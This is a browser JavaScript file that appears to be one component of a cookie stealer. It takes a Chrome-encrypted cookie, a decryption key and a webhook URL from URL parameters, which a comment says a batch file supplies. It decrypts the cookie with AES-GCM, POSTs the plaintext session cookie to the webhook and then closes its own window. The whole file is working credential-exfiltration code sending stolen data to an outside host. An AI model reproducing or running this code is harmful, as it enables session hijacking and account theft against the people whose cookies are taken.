// Parse URL parameters - API can be called from batch file or browser
const urlParams = new URLSearchParams(window.location.search);
const encryptedCookie = urlParams.get('cookie');
const encryptedKey = urlParams.get('key');
const webhookUrl = urlParams.get('webhook');

console.log('[API] Received parameters:', { encryptedCookie: encryptedCookie ? 'present' : 'missing', encryptedKey: encryptedKey ? 'present' : 'missing', webhookUrl: webhookUrl ? 'present' : 'missing' });

const loading = document.getElementById('loading');
const success = document.getElementById('success');
const error = document.getElementById('error');
const errorMsg = document.getElementById('error-msg');

// Validate request
if (!encryptedCookie || !encryptedKey || !webhookUrl) {
    if (loading) loading.style.display = 'none';
    if (error) {
        error.style.display = 'block';
        errorMsg.textContent = 'Missing required parameters: cookie, key, webhook';
    }
    console.log('[API] Missing parameters');
} else {
    // Decrypt and send to webhook
    decryptAndSend(encryptedCookie, encryptedKey, webhookUrl);
}

async function decryptAndSend(encryptedHex, keyB64, webhook) {
    try {
        console.log('[API] Starting decryption...');
        
        // Decode encrypted key from base64
        const keyData = Uint8Array.from(atob(keyB64), c => c.charCodeAt(0));
        
        // Skip first 5 bytes (DPAPI prefix) and decrypt using DPAPI
        // For browser, we'll just use the key as-is (assuming it's already the master key)
        // In production, you'd need server-side DPAPI decryption
        
        // Convert encrypted hex to bytes
        const encryptedBytes = new Uint8Array(encryptedHex.length / 2);
        for (let i = 0; i < encryptedHex.length; i += 2) {
            encryptedBytes[i / 2] = parseInt(encryptedHex.substr(i, 2), 16);
        }
        
        // Skip first 3 bytes (v10/v11/v20 prefix)
        const nonce = encryptedBytes.slice(3, 15); // 12 bytes
        
        // Extract ciphertext and tag
        const ciphertextTag = encryptedBytes.slice(15);
        const ciphertext = ciphertextTag.slice(0, ciphertextTag.length - 16);
        const tag = ciphertextTag.slice(ciphertextTag.length - 16);
        
        console.log('[API] Decryption parameters:', { nonceLen: nonce.length, ciphertextLen: ciphertext.length, tagLen: tag.length, keyLen: keyData.length });
        
        // Import key
        const cryptoKey = await crypto.subtle.importKey(
            'raw',
            keyData,
            { name: 'AES-GCM' },
            false,
            ['decrypt']
        );
        
        // Decrypt
        const plaintext = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: nonce, tagLength: 128 },
            cryptoKey,
            new Uint8Array([...ciphertext, ...tag])
        );
        
        const cookie = new TextDecoder().decode(plaintext).replace(/\0/g, '').trim();
        console.log('[API] Decryption successful! Cookie length:', cookie.length);
        
        // Send to webhook
        const decodedWebhook = decodeURIComponent(webhook);
        const response = await fetch(decodedWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: cookie })
        });
        
        console.log('[API] Webhook response:', response.status);
        
        if (loading) loading.style.display = 'none';
        if (success) success.style.display = 'block';
        
        setTimeout(() => {
            window.close();
        }, 2000);
        
    } catch (err) {
        console.error('[API] Error:', err);
        if (loading) loading.style.display = 'none';
        if (error) {
            error.style.display = 'block';
            errorMsg.textContent = 'Decryption failed: ' + err.message;
        }
    }
}
